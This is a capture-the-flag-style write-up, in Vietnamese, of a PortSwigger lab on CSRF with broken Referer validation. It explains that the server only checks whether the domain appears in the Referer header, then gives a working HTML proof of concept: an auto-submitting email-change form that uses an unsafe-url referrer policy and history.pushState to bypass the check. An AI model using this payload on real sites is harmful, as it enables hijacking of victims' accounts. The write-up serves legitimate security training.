![image](https://github.com/user-attachments/assets/cc5f9f93-15e7-4669-89e0-59424a90b31c)

![image](https://github.com/user-attachments/assets/4511c2d9-365c-4457-8324-607aa893fcda)

![image](https://github.com/user-attachments/assets/26dd72bb-d4aa-4b6b-91cf-2ef82e3afcd3)

Bạn quan sát được sự khác biệt chứ.

Đó chính là nó sẽ check xem cùng domain hay không? nó chỉ quan tâm có cùng domain hay không thôi, và cơ chế check của nó thì tôi có thể đoán được rằng nó đang check xem domain đó có tồn tại trong referer hay không, nếu có thì nó sẽ pass, nó sẽ không quan tâm đằng sau cái domain đó là cái gì.

Và đây sẽ là 1 lỗ hổng giúp ta bypass, tức là giờ ta sẽ tìm cách nối dài cái url này bằng cách query nó chẳng hạn `?`.

```
Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net
```

Vậy vẫn chưa đủ, tiến hành thêm `<meta name="referrer" content="unsafe-url">`.

Nhiều trình duyệt hiện nay sẽ tự động bỏ query string trong Referer vì lý do bảo mật. Để tránh điều này, thêm tiêu đề Referrer-Policy vào phần <head> của HTML để yêu cầu trình duyệt giữ nguyên URL đầy đủ

Tiến hành tạo 1 cái poc csrf cơ bản

```
<html>
  <head>
    <meta name="referrer" content="unsafe-url">
  </head>
  <body>
    <form action="https://0aca00ec0326dd8f8236fda100c2001b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="a112dmin&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // Thêm query string chứa tên miền lab để bypass kiểm tra Referer
      history.pushState('', '', '/?0aca00ec0326dd8f8236fda100c2001b.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![image](https://github.com/user-attachments/assets/7c773dc0-22e4-4e26-ad81-04112efb148b)

Vậy là đã thành công

## REFERENCES
[1]. https://www.trustedsec.com/blog/setting-the-referer-header-using-javascript

[2]. https://medium.com/@frank.leitner/writeup-csrf-where-token-is-tied-to-non-session-cookie-portswigger-academy-60fb8062363b

[3]. https://medium.com/@uchiha-rem01x/lab-csrf-with-broken-referer-validation-66970e73e484
